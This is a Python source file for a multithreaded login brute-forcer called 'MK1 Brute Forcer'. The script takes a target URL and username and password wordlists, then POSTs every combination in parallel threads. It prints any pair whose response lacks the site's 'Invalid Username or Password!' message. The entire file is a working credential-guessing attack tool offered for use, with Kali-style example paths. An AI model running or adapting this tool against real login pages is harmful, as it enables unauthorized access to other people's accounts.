import requests
import itertools
from concurrent.futures import ThreadPoolExecutor
import argparse
print("""
 __  __ _  __  _
|  \/  | |/ / / |
| |\/| | ' /  | |
| |  | | . \  | |
|_|  |_|_|\_\ |_|
v1.1
Created By: Kirito34086
""")
parser = argparse.ArgumentParser(description="MK1 Brute Forcer")
parser.add_argument('-u','--url', help="Target Url (e.g: http://127.0.0.1:5000/login)",required=True)
parser.add_argument('-n','--names',help="File path of Username list (e.g: /home/kali/usernames.txt)",required=True)
parser.add_argument('-p','--passwords',help="File path of Password list (e.g: /home/kali/passwords.txt)",required=True)
flited = parser.parse_args()
input_url = flited.url
input_username = flited.names
input_password = flited.passwords
thread_count = None
def thread_acceptor():
	global thread_count
	x = False
	while x==False:
		try:
			input_thread = input("Enter Number of Tharead(1-100):")
			thread_count  = int(input_thread)
			if thread_count > 100 or thread_count < 1:
				print("[/] Thread must be (1-100):")
				continue
			else:
				return thread_count
				x = True
		except ValueError:
			print("\n[-] Vlue Error: Enter only Number!")
		except KeyboardInterrupt:
			print("[-] Exiting...")
			exit()
thread_acceptor()
url = input_url
username = input_username
password = input_password
password_found = False
correct_password = None
def brute_forcer(user_pass):
	global password_found, correct_password
	if password_found:
		return
	User,Pass = user_pass
	datas = {
		"user":User,
		"pass":Pass
	}
	try:
		result =  requests.post(url,data=datas, timeout=5)
		if result.status_code == 200 and "Invalid Username or Password!" not in result.text:
			password_found = True
			print("====== [Password Found!] ======")
			print(f"\n[+] Username: {User}\n[+] Password: {Pass}\n")
			print("===============================")
		else:
			pass
	except Exception as e:
		return None
def main():
	global password_found
	try:
		print("[*] Started Attacking...\n")
		print(f"[*] Target url: {url}\n")
		with open(username, 'r') as u_file:
			user_list = [u.strip() for u in u_file.readlines() if u.strip()]
		with open(password, 'r') as p_file:
			file_end = False
			while not file_end and not password_found:
				pass_list = []
				for u in range(1000):
					line = p_file.readline()
					if not line:
						file_end = True
					if line.strip():
						pass_list.append(line.strip())
				if not pass_list:
					break
				combo_list = itertools.product(user_list,pass_list)
				with ThreadPoolExecutor(max_workers=thread_count) as executor:
					executor.map(brute_forcer,combo_list)
	except KeyboardInterrupt:
		print("[-] Exiting...")
	except FileNotFoundError:
		print("[-] Error: File Not Found!")
	except Exception as e:
		print(f"[-] Error: {e}")
main()
